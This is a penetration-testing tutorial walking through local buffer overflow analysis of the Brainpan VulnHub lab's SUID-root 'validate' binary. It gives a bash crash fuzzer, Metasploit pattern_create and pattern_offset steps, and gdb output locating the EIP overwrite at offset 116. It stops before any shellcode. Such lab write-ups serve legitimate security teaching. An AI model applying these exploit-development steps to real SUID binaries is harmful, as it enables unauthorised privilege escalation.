# Local Buffer Overflow
Have you found a Linux ELF binary that shows signs of homebrew and is SUID to root? Let's analyze the `/usr/local/bin/validate` file from the Brainpan lab exercise from VulnHUB.com

## Bring it on Home
First, we need to bring the binary back to our attacker machine for analysis. We can do so two different ways that are descibed in the [Data Exfiltration Infiltration](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Post%20Exploitation/data-exfiltration-infiltration.md) cheat sheet in the Grimoire. We do this so that we can easilt analyze the binary using forensics tools that the compromised host might not have installed. 

Ensure that the binary was successfully transferred without corruption by using the `md5sum` command on the binary at the compromised Target system and compare it to the md5sum of the binary on your local Attacker machine.
```
root@attacker-machine:~# md5sum validate
9e7865f1e663529db5d8b1ecb7118490  validate
```
```
user@target-machine:~$ md5sum validate
9e7865f1e663529db5d8b1ecb7118490  validate
```
## File Command
The #1 step for binary analysis on our Attacker system is to run the `file` command. The output of this command is valuable in ensuring,
1. What type of file we have, in our case ELF 32-bit
2. Which libraries/interpreters are required for the binary to execute, in our case was , `/lib/ld-linux.so.2`

So, to get [`/lib/ld-linux.so.2`](https://packages.debian.org/stretch/libc6-i386) installed on our local Attacker system, we will need the `libc6-i686` package.
```
root@attacker-machine:~# apt install libc6-i386
```
## Strings
The #2 step to analyzing a binary is to use the `strings command`. Strings will prvide us with more clues, in our case we see,
```
usage %s <input>
validating input...
passed.
```
So, we know that the application does handle input.
### Fuzz it
Next, we simply pass the application input in increasing sizes until we get it to Segmentation Fault. I wrote a nice little script that will determnine the buffer size for us below. Simply pass the binary's name, n our case `validate`, as an argument.
```
#!/bin/bash
# Standard In C program fuzzer
# 2019 WeakNet Labs, Douglas Berdeaux
buf="" # this will be the buffer overflow
appname=$1 # pass to me the app name
while [ 1 ]
 do
  buf+="A"
  #printf "[*] buf is now: $buf\n";
  seg=$(./${appname} $buf || echo "0x031337" | egrep "0x031337"| wc -l)
  if [[ "$seg" == "1" ]]
   then
    printf "[!] Segmentation Fault Successful! ($(echo -n $buf|wc -m)) bytes.\n"
    exit;
  fi
done;
```
and the output,
```
root@attacker-machine:~# ./stdin-fuzz.sh validate
[!] Segmentation Fault Successful! (112) bytes.
root@attacker-machine:~#
```
The length of `112` bytes crashed our program, but we probably need (at least 4) more bytes to overwrite EIP. To find out how many extra bytes we need, we will use `create_pattern.rb` module from the Metasploit Framework as so,
```
/infose/exploitation/metasploit-framework/tools/exploit/pattern_create.rb -l 144 # added 32 bytes
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7
```
Start `validate` with the GNU Debugger, `gdb` as so,
```
root@attacker-machine:~# gdb validate 
Reading symbols from validate...done.
gdb-peda$ run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7
Starting program: /root/Penetration Testing/VulnHUB/Brainpan/files/validate Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd1b8 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7")
EBX: 0x41366441 ('Ad6A')
ECX: 0xffffd540 ("5Ae6Ae7")
EDX: 0xffffd241 ("5Ae6Ae7")
ESI: 0x2 
EDI: 0xf7fbd000 --> 0x1b2db0 
EBP: 0x64413764 ('d7Ad')
ESP: 0xffffd230 ("Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7")
EIP: 0x39644138 ('8Ad9')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x39644138
[------------------------------------stack-------------------------------------]
0000| 0xffffd230 ("Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7")
0004| 0xffffd234 ("e1Ae2Ae3Ae4Ae5Ae6Ae7")
0008| 0xffffd238 ("2Ae3Ae4Ae5Ae6Ae7")
0012| 0xffffd23c ("Ae4Ae5Ae6Ae7")
0016| 0xffffd240 ("e5Ae6Ae7")
0020| 0xffffd244 ("6Ae7")
0024| 0xffffd248 --> 0x8048500 (<validate+76>:	call   0x8c048503)
0028| 0xffffd24c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x39644138 in ?? ()
gdb-peda$ quit
root@attacker-machine:~#  /infosec/exploitation/metasploit-framework/tools/exploit/pattern_offset.rb -q 39644138
[*] Exact match at offset 116
root@attacker-machine:~#  
```
We can see that the EIP was overwritten with, 39644138, which we validated the location in the buffer string to be `116` using the `pattern_offset.rb` Metsplaoit Ruby module.
